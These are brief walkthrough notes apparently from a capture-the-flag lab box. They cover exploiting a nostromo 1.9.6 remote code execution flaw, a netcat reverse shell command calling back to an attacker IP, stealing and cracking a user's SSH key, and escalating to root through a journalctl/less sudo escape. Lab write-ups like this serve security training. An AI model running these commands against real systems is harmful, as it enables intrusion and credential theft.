- Did an nmap and found two ports open 22-ssh and 80-running nostromo 1.9.6 (instead of our usual apache).
- nostromo 1.9.6 had an rce vulnerability
- The CVE is in this folder
- The python script needed the host ip host port and a command to be executed on the host
- Used ./nostroSploit.py 10.10.10.165 80 "nc -e /bin/sh 10.10.14.140 4444"   (netcat reverse shell)
- Got shell as www-data and found a folder /var/nostromo/ containing a hint to a directory public_www
- This folder was in another user David's home
- It has david's ssh private rsa in a tar archive
- Transferred the file to local machine using nc (google if you forgot).
- untarred passed the ssh key through sshng2john.py and passed to john to crack.
- The password was hunter
- Logged in as david.
- He had a binary that hinted to the allowed sudo command called journalctl
- executed this command whose output was shown in less
- A gtfobin said to spawn interactive shell from this by hitting !/bin/bash 
- Got root.
